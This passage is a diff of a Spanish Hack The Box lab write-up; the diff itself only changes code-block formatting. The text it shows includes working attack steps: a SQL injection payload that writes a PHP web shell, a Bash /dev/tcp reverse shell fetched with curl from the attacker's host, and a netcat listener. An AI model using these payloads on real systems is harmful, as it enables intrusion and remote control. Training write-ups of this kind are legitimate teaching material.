@@ -81,7 +81,7 @@ nmap -sVC -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,49667,49
 
 Al ver que tenemos un puerto **http** abierto vamos a hacer un reconocimiento de las tecnologías web que usa con **whatweb**.
 
-```
+```bash wrap=false
 http://10.10.11.116 [200 OK] Apache[2.4.48], Bootstrap, Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.48 (Debian)], IP[10.10.11.116], JQuery, PHP[7.4.23], Script, X-Powered-By[PHP/7.4.23]
 ```
 
@@ -97,13 +97,13 @@ El campo del **usuario** no es vulnerable a **SQL Injection**, pero podemos inte
 
 Bingo! Como podemos ver con una sola **'**, vemos que da un error, por lo cual es vulnerable. Vamos a intentar subir una **web shell** básica para **PHP**.
 
-```
+```php wrap=false
 <?php system($_GET['cmd']); ?>
 ```
 
 Así quedaría la inyección en la solicitud.
 
-```
+```txt wrap=false
 username=sqli&country=Brazil' union all select "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/wshell.php" -- -
 ```
 
@@ -112,19 +112,19 @@ username=sqli&country=Brazil' union all select "<?php system($_GET['cmd']); ?>" 
 
 Perfecto, hemos conseguido la web shell funcional, por lo que vamos a intentar obtener una persistencia. Usaremos esta **Bash TCP reverse shell**.
 
-```
+```bash wrap=false
 bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
 ```
 
 Y luego la pasaremos al servidor mediante un servidor local con **python**.
 
-```
+```bash wrap=false
 python -m http.server 80
 ```
 
 Después en la **URL** pondremos lo siguiente para obtener la **shell**.
 
-```
+```bash wrap=false
 <URL>?cmd=curl+<IP>:80/revshell.sh > revshell.sh
 ```
 
@@ -132,13 +132,13 @@ Una vez subido, para comprobar que todo ha ido bien, si ejecutamos un **ls** deb
 
 Para ejecutarla nos pondremos en escucha primero por el puerto que hayamos escogido con **netcat**.
 
-```
+```bash wrap=false
 nc -lvnp <PORT>
 ```
 
 Simplemente la ejecutamos en el servidor.
 
-```
+```bash wrap=false
 bash revshell.sh
 ```
 
@@ -152,11 +152,11 @@ Estando dentro podemos ver que hay un archivo **config.php**, así que veremos s
 
 Gracias al comando:
 
-```
+```bash wrap=false
 cat /etc/passwd | grep "bash"
 ```
 
-Podemos ver que solo existe el usuario **root**, que si probamos con la contraseña del **config.php** parecerá que se queda estancado, pero realmente ya hemos accedido al usuario y tenemos root. Ya solo queda obtener ambas flags del directorio /home/\<usuario>/user.txt y /root/root.txt.
+Podemos ver que solo existe el usuario **root**, que si probamos con la contraseña del **config.php** parecerá que se queda estancado, pero realmente ya hemos accedido al usuario y tenemos root. Ya solo queda obtener ambas flags del directorio `/home/<usuario>/user.txt` y `/root/root.txt`.
 
 [Pwned!](https://labs.hackthebox.com/achievement/machine/1992274/382)
 
